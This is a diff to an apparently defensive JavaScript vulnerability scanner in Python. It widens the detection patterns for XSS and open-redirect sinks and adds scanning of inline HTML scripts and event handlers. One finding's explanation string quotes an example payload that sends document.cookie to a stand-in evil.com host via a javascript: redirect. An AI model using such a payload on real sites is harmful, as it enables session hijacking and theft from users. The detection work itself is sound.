@@ -65,7 +65,7 @@ _XSS_SINKS: List[Tuple[str, re.Pattern, Severity, str, str, str]] = [
     ),
     (
         "setTimeout with string argument",
-        re.compile(r"""setTimeout\s*\(\s*['"`]"""),
+        re.compile(r"""\bsetTimeout\s*\(\s*(?:['"`]|(?:[a-zA-Z0-9_$.]+\s*\+)|(?:string|code|payload|data|input|cmd|buf|msg|eval|val|param|user)\b)""", re.IGNORECASE),
         Severity.MEDIUM,
         "setTimeout() with string argument acts like eval().",
         "setTimeout('alert(1)', 0) executes the string as code. If user input reaches the string argument, attacker gets code execution.",
@@ -73,11 +73,19 @@ _XSS_SINKS: List[Tuple[str, re.Pattern, Severity, str, str, str]] = [
     ),
     (
         "setInterval with string argument",
-        re.compile(r"""setInterval\s*\(\s*['"`]"""),
+        re.compile(r"""\bsetInterval\s*\(\s*(?:['"`]|(?:[a-zA-Z0-9_$.]+\s*\+)|(?:string|code|payload|data|input|cmd|buf|msg|eval|val|param|user)\b)""", re.IGNORECASE),
         Severity.MEDIUM,
         "setInterval() with string argument acts like eval().",
         "Same as setTimeout — string arguments are executed as code repeatedly.",
         "CWE-95",
+    ),
+    (
+        "jQuery .html() assignment",
+        re.compile(r"""\.html\s*\(\s*(?!["'`][a-zA-Z0-9_\s-]*["'`]\s*\))[^)]+"""),
+        Severity.HIGH,
+        "jQuery .html() with dynamic content enables DOM-based XSS.",
+        "Attacker injects HTML via parameter into jQuery's .html() method, executing arbitrary script in the victim's context.",
+        "CWE-79",
     ),
 ]
 
@@ -96,7 +104,7 @@ _DANGEROUS_PATTERNS: List[Tuple[str, re.Pattern, Severity, str, str, str]] = [
     ),
     (
         "location.href assignment from input",
-        re.compile(r"""(?:location\.href|location\.replace|location\.assign|window\.open)\s*[=(]\s*(?!['"])"""),
+        re.compile(r"""(?:(?:window\.)?location(?:\.href)?\s*=\s*(?!['"])|(?:location\.replace|location\.assign|window\.open)\s*\(\s*(?!['"]))"""),
         Severity.MEDIUM,
         "Dynamic URL redirect — potential open redirect or javascript: URI injection.",
         "Attacker crafts: ?redirect=javascript:fetch('https://evil.com/steal?c='+document.cookie). If the parameter reaches location.href, the JS executes. Even without javascript:, open redirects enable phishing: victim sees trusted domain, gets sent to evil.com login page.",
@@ -199,11 +207,68 @@ class JavaScriptScanner(BaseScanner):
         for f in js_files:
             self._scan_file(f.local_path, f.url)
 
+        # Scan inline scripts and event handlers from HTML files
+        html_files = []
+        all_files = getattr(self._report, "files", None) or getattr(self._report, "downloaded_files", None) or []
+        for f in all_files:
+            if getattr(f, "error", "") or not getattr(f, "local_path", ""):
+                continue
+            lower = f.local_path.lower()
+            ct = getattr(f, "content_type", "").lower()
+            if any(lower.endswith(ext) for ext in (".html", ".htm", ".php", ".asp", ".aspx", ".jsp")) or "text/html" in ct or "." not in os.path.basename(f.local_path):
+                html_files.append(f)
+
+        self._scan_html_inline_scripts(html_files)
+
         # Check for source maps
         self._check_source_maps()
 
         self._log(f"JS scan complete: {len(self._findings)} findings")
-        return self._build_result(start, files_scanned=len(js_files))
+        return self._build_result(start, files_scanned=len(js_files) + len(html_files))
+
+    def _scan_html_inline_scripts(self, html_files: list) -> None:
+        """Extract and scan inline <script> blocks and on* event handler attributes from HTML files."""
+        for hf in html_files:
+            try:
+                if not os.path.isfile(hf.local_path):
+                    continue
+                size = os.path.getsize(hf.local_path)
+                if size > 2_000_000:
+                    continue
+                with open(hf.local_path, "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+
+                from bs4 import BeautifulSoup
+                soup = BeautifulSoup(content, "html.parser")
+
+                # Scan inline <script> tags
+                script_idx = 0
+                for script in soup.find_all("script"):
+                    if script.get("src"):
+                        continue
+                    script_type = (script.get("type") or "").lower()
+                    if any(t in script_type for t in ("json", "ld+json", "importmap")):
+                        continue
+                    script_body = script.get_text()
+                    if not script_body.strip():
+                        continue
+                    script_idx += 1
+                    virtual_url = f"{hf.url}#inline-script-{script_idx}"
+                    virtual_fp = f"{hf.local_path}#inline-script-{script_idx}"
+                    for line_num, line in enumerate(script_body.splitlines(), 1):
+                        self._check_xss_sinks(line, virtual_fp, virtual_url, line_num)
+                        self._check_dangerous(line, virtual_fp, virtual_url, line_num)
+
+                # Scan inline on* event handler attributes
+                for tag in soup.find_all(True):
+                    for attr, val in tag.attrs.items():
+                        if attr.lower().startswith("on") and isinstance(val, str) and val.strip():
+                            virtual_url = f"{hf.url}#{tag.name}[{attr}]"
+                            virtual_fp = f"{hf.local_path}#{tag.name}[{attr}]"
+                            self._check_xss_sinks(val, virtual_fp, virtual_url, 1)
+                            self._check_dangerous(val, virtual_fp, virtual_url, 1)
+            except Exception as e:
+                self._log(f"Error scanning inline scripts in {hf.url}: {e}")
 
     def _scan_file(self, filepath: str, url: str) -> None:
         try:
